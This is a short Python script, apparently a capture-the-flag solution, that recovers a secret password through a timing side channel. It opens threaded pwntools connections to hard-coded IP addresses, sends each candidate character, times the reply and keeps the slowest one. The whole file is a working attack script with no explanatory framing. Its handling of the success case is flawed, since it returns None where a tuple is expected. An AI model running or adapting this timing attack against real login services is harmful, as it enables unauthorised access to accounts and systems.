#Script from Jules Oosterlynck
from pwn import *
import time
from multiprocessing.dummy import Pool as ThreadPool
from functools import partial

alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{}#!?-*&%$@"

def main():
	mystr = ""
	while True:
		tot_results = {}
		for letter in alphabet:
			tot_results[letter] = 0
		# launch as many threads as chars in our alphabet

		for i in range(5):
			pool = ThreadPool(len(alphabet))
			results = pool.map(partial(tryPassword, mystr = mystr), alphabet)
			pool.close()
			pool.join()
			# print results
			for r in results:
				tot_results[r[0]]+=r[1]
		newchar = max(tot_results, key=tot_results.get)
		mystr += newchar

​

def tryPassword(c,mystr):
	server = remote("46.137.38.11", 2555)
	print('Testing password:',mystr + c)
	# 46.137.38.11 2555 OR 54.155.193.84 2556 OR 3.248.160.188 2554
	server.recvline() # "Please enter the very secret password:"
	server.recv()
	try:
		server.sendline(mystr + c)
		# start measurement
		start = time.time()
		s = server.recv(4096).decode()
		s = server.recv(4096).decode()
		end = time.time()
		# stop measurement
		if "doesn" not in s:
			print('The password is:',mystr + c)
			print(s)
			return

	except Exception:
		# we'll run into an exception if the server close the connection
		pass	
	# report results
	return (c, end-start)

if __name__ == '__main__':
	main()

